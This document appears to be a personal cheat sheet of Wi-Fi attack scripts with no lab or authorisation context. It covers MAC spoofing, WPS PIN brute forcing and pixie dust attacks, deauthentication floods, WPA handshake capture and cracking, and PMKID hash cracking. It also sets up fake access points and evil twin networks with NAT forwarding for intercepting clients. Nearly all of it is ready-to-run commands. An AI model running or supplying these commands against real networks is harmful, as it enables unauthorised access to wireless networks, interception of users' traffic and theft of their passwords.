### Wifi setup

Change to a random MAC and enable monitor mode.

`wifi-setup.sh`

```bash
ifconfig wlan1 down
macchanger -A wlan1
ifconfig wlan1 up
airmon-ng start wlan1
```

### Find Target Network

```bash
airodump-ng wlan1mon
airodump-ng wlan1mon --band a #5Ghz scan
```

Add -c for specific channel
Take note of Access Point name, MAC address, channel, and client MAC if applicable

### Set target

Write target details to txt file to use with other scripts

`set-target.sh`

### WPS attacks

Scan for WPS-enabled APs

`wps-scan.sh`

```bash
   wash -i wlan1mon -c $channel
```


Test common default PINs and Null PIN

`default-pins.sh`

```bash
for pin in '' 12345670 00000000 11111111 01230123 31415926; do reaver -i wlan1mon -b $ap_mac -c $channel -f -N -g 1 -vv -p "$pin" done
```


Launch pixie dust attack

`reaver1.sh`

```bash
   reaver -i wlan1mon -b $ap_mac -c $channel -K 1 -N -vv
```

Different implementation of a pixie dust attack

`bully1.sh`

```bash
bully wlan1mon -b $ap_mac -c $channel -e $essid -d -v 4 -F -D -A -C -l 90 -w ~/.bully/
```

For difficult/locked APs

`reaver2.sh`

```bash
#!/bin/bash
# Reaver with EAP terminate and timeout-is-nack
reaver -i wlan1mon -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A
```

- `-E`: EAP terminate after each session
- `-J`: Treat timeout as NACK (for DIR-300/320 routers)


Sequential brute force with checksum brute forcing

`bully2.sh`

```bash
bully wlan1mon -b $ap_mac -c $channel -S -F -B -v 3
```

Last resort brute force (slow)

`reaver3.sh`

```bash
reaver -i wlan1mon -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc
```


Custom wifite settings for automated attacks

`wifite-wps.sh`

```bash
wifite --wps-only --bully --ignore-locks --kill -i wlan1mon
```

- `--wps-only`: Only WPS attacks
- `--pixie`: Force Pixie Dust (default enabled)
- `--bully`: Use bully instead of reaver (optional)
- `--ignore-locks`: Continue even if locked


Known PIN to extract password

`wps-pin.sh`

```bash
reaver -i wlan1mon -b $ap_mac -c $channel -p $pin -N -vv
```

### Set Up Monitoring and packet capture

Capture wifi traffic and output to pcap file

`capture.sh`

```bash
airodump-ng -c $channel -w capture wlan1mon --bssid $ap_mac
```

### Deauthenticate Clients

Deauthenticate all clients connected to access point. When clients reconnect the handshake will be captured

`deauth-all.sh`

```bash
aireplay-ng -0 0 -a $ap_mac wlan1mon
```

Deauthenticate target client

`deauth-target.sh`

```bash
aireplay-ng --deauth 0 -a $ap_mac -c $client_mac wlan1mon
```


### Extract and handshake and crack the password

Extract the handshake packets and output to a new pcap file

`handshake.sh`

```bash
tshark -r capture.cap -Y "eapol.type == 3" -w handshake.cap -F pcap
```

**Crack the handshake:**

```bash
aircrack-ng handshake.pcap -w wordlist.txt,wordlist2.txt
```


### Fake Access Point attack

Set up fake access point that accepts all probes. This will capture handshakes from clients that are not connected and have preferred networks

`fake-ap.sh`

```bash
airbase-ng -c $channel -Z 4 -W 1 wlan1mon
```

Fast Response AP

`fake-ap-fast.sh`

```bash
airbase-ng -c $channel -Z 2 -W 1 wlan1mon
```

### Evil Twin attack

Set up access point with the same name as target access point. Targeted attack against a client. Can also be used as a honeypot. Will work with some implementations of WPA3.

`evil-twin.sh`

```bash
airbase-ng -c $channel -e $ap_name -a $ap_mac -Z 4 -W 1 wlan1mon
```

Fast Response AP

`evil-twin-fast.sh`

```bash
airbase-ng -e $ap_name -c $channel -a $ap_mac -Z 2 -W 1 wlan1mon
```

Channel hopping

`evil-twin-hop.sh`

```bash
mdk4 wlan1mon b -n $ap_name -m -s 100 -w a
```

Deauthenticate all clients

### Set up NAT forwarding

Bring up interface and assign IP, enable forwarding and set up NAT, run DHCP server for clients on fake AP

`nat-setup.sh`

```bash
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
iptables -P FORWARD ACCEPT
dnsmasq --interface=at0 --dhcp-range=10.0.0.10,10.0.0.100,12h --no-daemon
```

### Undo changes

Remove iptables rules, disable IP forwarding bring down the at0 interface

`nat-reset.sh`

```bash
ifconfig at0 down echo 0 > /proc/sys/net/ipv4/ip_forward iptables -F iptables -t nat -F iptables -P FORWARD DROP
```

### PMKID capture (clientless WPA2 cracking)

Capture PMKID

`pmkid-cap.sh`

```bash
   hcxdumptool -i wlan1 -w pmkid.pcapng --rds=1
```

Watch for  "FOUND PMKID" messages

Convert capture to hashcat format

`pmkid-hc.sh`

```bash
   hcxpcapngtool -o hashes.hc22000 pmkid.pcapng
```

**Crack with hashcat**

```bash
   hashcat -m 22000 hashes.hc22000 wordlist.txt
```

